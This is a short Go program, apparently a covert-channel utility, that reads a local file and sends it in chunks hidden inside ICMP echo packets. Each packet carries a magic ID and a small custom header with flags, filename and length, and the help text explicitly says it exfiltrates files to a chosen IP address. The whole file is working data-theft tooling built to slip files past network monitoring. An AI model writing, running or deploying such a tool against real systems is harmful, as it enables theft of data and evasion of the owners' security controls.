package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

const BUFFERSIZE = 512
const MAGIC = 0xA00A
const FIRSTFLAGMASK = 0x01
const LASTFLAGMASK = 0x02
const IPV4ICMP = 8

type exfil struct {
	first    bool
	last     bool
	filename string
	data     []byte
}

func buildFlags(pak exfil) byte {
	var flags byte
	flags = 0

	if pak.first {
		flags |= FIRSTFLAGMASK
	}
	if pak.last {
		flags |= LASTFLAGMASK
	}

	return flags
}

func buildExfilPacket(pak exfil) []byte {
	offset := 0
	pakLength := len(pak.data) + 3
	if pak.first {
		pakLength += len(pak.filename) + 1
	}
	b := make([]byte, pakLength)

	// flags for exfil header
	b[offset] = buildFlags(pak)
	offset += 1

	// Special fields for first packet
	if pak.first {
		b[offset] = uint8(len(pak.filename))
		offset += 1
		copy(b[offset:offset+len(pak.filename)], []byte(pak.filename))
		offset += len(pak.filename)
	}

	// file data
	var dataLen uint16 = uint16(len(pak.data))
	binary.BigEndian.PutUint16(b[offset:offset+2], dataLen)
	offset += 2
	copy(b[offset:offset+len(pak.data)], []byte(pak.data))

	return b
}

func main() {
	var file = flag.String("f", "", "the file to exfiltrate via ICMP")
	var debug = flag.Bool("d", false, "enable debug output")
	var help = flag.Bool("h", false, "show help.")
	var host = flag.String("l", "127.0.0.1", "the location ip to send the file to")

	flag.Parse()

	// Print help
	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}

	// Open the local file
	f, err := os.Open(*file)
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer f.Close()

	// make file buffer
	buf := make([]byte, BUFFERSIZE)

	// Initialize data packet
	exfilPak := exfil{true, false, filepath.Base(*file), buf}
	echoPak := icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
	fullPak := icmp.Message{Type: ipv4.ICMPType(IPV4ICMP), Code: 1, Checksum: 0, Body: &echoPak}

	// open up the "socket"
	socket, sockErr := icmp.ListenPacket("ip4:icmp", *host)
	if sockErr != nil {
		log.Fatalln(sockErr)
		return
	}
	var b, pak = []byte(nil), []byte(nil)

	// if the file is big enough, keep sending data
	for {
		bytesRead, fileError := f.Read(buf)
		if fileError == io.EOF {
			break
		}
		exfilPak.data = buf[0:bytesRead]
		if *debug {
			fmt.Printf("buffer contents:\n%s\n", buf)
		}
		if bytesRead < BUFFERSIZE {
			break
		}
		pak := buildExfilPacket(exfilPak)
		echoPak.Data = pak
		fullPak.Body = icmp.MessageBody(&echoPak)
		b, marshErr := fullPak.Marshal(nil)
		if marshErr != nil {
			log.Fatalln(marshErr)
			return
		}
		socket.WriteTo(b, socket.LocalAddr())
		echoPak.Seq += 1
		exfilPak.first = false
	}

	// last iteration
	exfilPak.last = true
	pak = buildExfilPacket(exfilPak)
	echoPak.Data = pak
	fullPak.Body = icmp.MessageBody(&echoPak)
	b, _ = fullPak.Marshal(nil)
	socket.WriteTo(b, socket.LocalAddr())
	return
}
